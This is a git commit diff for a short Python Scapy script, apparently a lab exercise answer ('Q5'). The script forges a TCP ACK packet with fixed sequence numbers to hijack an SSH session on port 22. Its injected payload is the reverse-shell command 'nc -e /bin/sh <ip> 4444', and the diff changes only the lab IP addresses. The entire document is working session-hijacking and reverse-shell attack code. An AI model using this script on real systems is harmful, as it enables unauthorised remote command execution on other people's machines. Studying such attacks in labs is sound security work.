87efb4667402da15e89a0dbdeddc6ec5cb2881a0
FishRainBlow <82390676+FishRainBlow@users.noreply.github.com>
2024-07-30 13:29:02 +0800

    Update and rename q5_rs.py to Q5_rs.py

--- Code Files/Q5_rs.py
+++ Code Files/Q5_rs.py
@@ -2,10 +2,10 @@
 import sys
 from scapy.all import *
 
-IPLayer = IP (src="10.10.10.185", dst = "10.10.10.186")
+IPLayer = IP (src="10.10.10.184", dst = "10.10.10.195")
 TCPLayer = TCP (sport=55228, dport=22, flags="A", seq=1436115963, ack=125328576)
 
-data = "\n nc -e /bin/sh 10.10.10.184 4444 \n"
+data = "\n nc -e /bin/sh 10.10.10.196 4444 \n"
 
 pkt=IPLayer/TCPLayer/data
 ls(pkt)
